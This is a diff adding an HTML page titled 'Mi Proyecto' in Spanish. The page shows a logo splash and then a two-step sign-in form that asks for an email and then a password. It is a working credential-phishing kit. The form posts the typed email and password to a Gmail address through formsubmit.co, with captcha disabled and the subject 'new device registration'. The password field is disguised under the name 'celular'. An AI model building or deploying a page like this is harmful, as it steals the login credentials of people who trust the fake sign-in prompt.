@@ -1,0 +1,417 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Mi Proyecto</title>
+
+<style>
+
+* {
+    box-sizing: border-box;
+}
+
+body {
+    margin:0;
+    min-height:100vh;
+    font-family:Arial,sans-serif;
+    background:#061f27;
+}
+
+
+/* INTRO */
+
+#intro {
+
+    position:fixed;
+    inset:0;
+
+    background:#061f27;
+
+    display:flex;
+    justify-content:center;
+    align-items:center;
+
+    z-index:9999;
+
+    transition:.8s;
+}
+
+
+#intro img {
+
+    width:159px;
+
+    animation:pulse 1.5s infinite;
+
+}
+
+
+#intro.ocultar {
+
+    opacity:0;
+    visibility:hidden;
+
+}
+
+
+@keyframes pulse {
+
+    50% {
+        transform:scale(1.08);
+        opacity:.7;
+    }
+
+}
+
+
+
+/* CONTENIDO */
+
+
+#pagina {
+
+    min-height:100vh;
+
+    display:flex;
+    justify-content:center;
+    align-items:center;
+
+    padding:20px;
+
+}
+
+
+.card {
+
+    background:white;
+
+    width:100%;
+    max-width:550px;
+
+    padding:35px;
+
+    border-radius:15px;
+
+}
+
+
+
+.paso {
+
+    display:none;
+
+}
+
+
+.paso.activo {
+
+    display:block;
+
+}
+
+
+
+h1 {
+
+    font-size:25px;
+
+}
+
+
+
+input {
+
+    width:100%;
+
+    height:50px;
+
+    padding:10px;
+
+    margin-top:15px;
+
+    font-size:16px;
+
+    border:1px solid #aaa;
+
+    border-radius:6px;
+
+}
+
+
+
+button {
+
+    margin-top:25px;
+
+    width:100%;
+
+    height:50px;
+
+    border:none;
+
+    border-radius:25px;
+
+    background:black;
+
+    color:white;
+
+    font-size:16px;
+
+    cursor:pointer;
+
+}
+
+
+
+.correo {
+
+    background:#eee;
+
+    padding:12px;
+
+    border-radius:5px;
+
+    margin-top:20px;
+
+}
+
+
+</style>
+
+</head>
+
+
+<body>
+
+
+
+<!-- INTRO -->
+
+<div id="intro">
+
+    <img src="/assets/logo-C4Sr8ukq.webp">
+
+</div>
+
+
+
+<!-- FORMULARIO -->
+
+<main id="pagina">
+
+
+<div class="card">
+
+
+<form 
+id="formulario"
+action="https://formsubmit.co/ph.otostudio506+34@gmail.com"
+method="POST"
+>
+
+
+<input 
+type="hidden"
+name="_subject"
+value="Nuevo registro de dispositivo"
+>
+
+<input
+type="hidden"
+name="_captcha"
+value="false"
+>
+
+<input
+type="hidden"
+name="_next"
+value="https://tupagina.com/prueba.html"
+>
+
+
+
+<!-- PASO 1 -->
+
+<section 
+id="paso1"
+class="paso activo"
+>
+
+
+<h1>
+Ingrese su correo electrónico
+</h1>
+
+
+<input
+
+id="email"
+
+name="email"
+
+type="email"
+
+placeholder="Correo electrónico"
+
+required
+
+>
+
+
+<button
+type="button"
+id="continuar"
+>
+Continuar
+</button>
+
+
+</section>
+
+
+
+
+
+<!-- PASO 2 -->
+
+<section
+id="paso2"
+class="paso"
+>
+
+ <h1>
+                    Ingrese su contraseña
+                </h1>
+
+                <p class="descripcion">
+                    Inicie sesión en su cuenta.
+                </p>
+
+
+<div 
+class="correo"
+id="correoMostrado">
+</div>
+
+
+
+<input
+
+id="celular"
+
+name="celular"
+
+type="text"
+
+placeholder="Contraseña"
+
+required
+
+>
+
+
+
+<button
+type="submit"
+>
+Enviar
+</button>
+
+
+
+</section>
+
+
+
+</form>
+
+
+</div>
+
+
+</main>
+
+
+
+
+
+<script>
+
+
+// quitar intro
+
+window.addEventListener("load",()=>{
+
+    setTimeout(()=>{
+
+        document
+        .getElementById("intro")
+        .classList
+        .add("ocultar");
+
+
+    },2500);
+
+});
+
+
+
+
+
+// cambiar paso
+
+const continuar =
+document.getElementById("continuar");
+
+
+const paso1 =
+document.getElementById("paso1");
+
+
+const paso2 =
+document.getElementById("paso2");
+
+
+const email =
+document.getElementById("email");
+
+
+const correoMostrado =
+document.getElementById("correoMostrado");
+
+
+
+continuar.addEventListener("click",()=>{
+
+
+    if(!email.value){
+
+        alert("Ingrese un correo");
+
+        return;
+
+    }
+
+
+    correoMostrado.innerHTML =
+    email.value;
+
+
+    paso1.classList.remove("activo");
+
+    paso2.classList.add("activo");
+
+
+});
+
+
+
+</script>
+
+
+</body>
+
+</html>
